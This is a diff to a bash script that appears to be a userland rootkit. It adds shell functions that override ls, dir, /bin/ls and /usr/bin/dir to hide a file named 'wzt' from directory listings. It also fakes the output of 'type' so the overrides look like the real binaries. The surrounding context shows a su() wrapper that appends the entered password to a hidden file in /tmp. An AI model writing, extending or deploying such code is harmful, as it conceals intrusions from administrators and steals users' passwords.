@@ -85,6 +85,18 @@ function type()
                 "builtin"|"declare"|"set"|"unset"|"type"|"typeset")
                         echo "$1 is a shell builtin"
                         return ;;
+		"dir")
+			echo "dir is /usr/bin/dir"
+			return ;;
+		"ls")
+			echo "ls is aliased to ls --color=tty"
+			return ;;
+		"/bin/ls")
+			echo "/bin/ls is /bin/ls"
+			return ;;
+		"/usr/bin/dir")
+			echo "bash: type: /bin/dir: not found"
+			return ;;
                 *)
 			unset command
                         command type $1 $2
@@ -244,57 +256,94 @@ function su()
         /bin/su && unset su && echo $pass >> /tmp/...
 }
 
+unalias ls >/dev/null 2>&1
+
 function max_file_length()
 {
-        local fake_file sum=0 n=0
+	local fake_file sum=0 n=0
 
-        for fake_file in $(/bin/ls)
-        do
-                n=${#fake_file}
-                [ $n -gt $sum ] && sum=$n
-        done
-
-        return $sum
+	for fake_file in $(/bin/ls $1)
+	do
+		n=${#fake_file}
+		[ $n -gt $sum ] && sum=$n
+	done
+	
+	return $sum
 }
 
 function ls()
 {
-        local fake_file max_col_num file_format
-        local file_len=0 sum=0 n=0
+	local fake_file max_col_num file_format
+	local new_file file_len=0 sum=0 n=0
+	local file_arg display_mode=0
 
-        max_col_num=`stty size|cut -d " " -f 2`
-        ((max_col_num-=0))
+	max_col_num=`stty size|cut -d " " -f 2`
 
-        case $1 in
-        "")
-                max_file_length
-                file_len=$?
+	for file_arg in $@
+	do
+        	if echo $file_arg|grep -q -e "^-.*l.*"; then
+			display_mode=1
+                	break
+        	fi
+	done
 
-                for fake_file in $(/bin/ls)
-                do
-                        if [ "$fake_file" == "wzt" ];then
-                                continue
-                        fi
+	case $display_mode in
+	0)
+		max_file_length $@
+		file_len=$?
 
-                        n=${#fake_file}
-                        ((sum=sum+n+file_len))
+		for fake_file in $(/bin/ls $@)
+        	do
+                	[ "$fake_file" == "wzt" ] && continue
 
-                        if [ $sum -gt $max_col_num ];then
-                                file_format="%-$file_len""s\n"
-                                printf $file_format $fake_file
-                                sum=0
-                        else
-                                file_format="%-$file_len""s"" "
-                                printf $file_format $fake_file
-                        fi
-                done
+			n=${#fake_file}
+			((sum=sum+n+file_len))
 
-                [ $sum -le $max_col_num ] && echo ""
-                return ;;
-        "*l*")
-                fake_file=`/bin/ls -l --color=tty`
-                new_file=`echo "$fake_file" | sed -e '/wzt/d'`
-                echo "$new_file"
-                return ;;
-        esac
+			if [ $sum -gt $max_col_num ];then
+				file_format="%-$file_len""s\n"
+				printf $file_format $fake_file
+				sum=0
+			else
+				file_format="%-$file_len""s "
+				printf $file_format $fake_file
+			fi
+        	done
+
+		[ $sum -le $max_col_num ] && echo ""
+		return ;;
+	1)	
+		fake_file=`/bin/ls $@`
+		new_file=`echo "$fake_file" | sed -e '/wzt/d'`
+		echo "$new_file"
+		return ;;
+	esac
+}
+
+function dir()
+{
+	ls $@
+}
+
+function /usr/bin/dir()
+{
+	unset -f /bin/ls
+	ls $@
+	reset_ls
+}
+
+function reset_ls()
+{
+	function /bin/ls()
+	{
+		unset -f /bin/ls
+		ls $@
+		reset_ls
+	}
+}
+
+function /bin/ls()
+{
+	unset -f /bin/ls
+	ls $@
+	reset_ls
 }
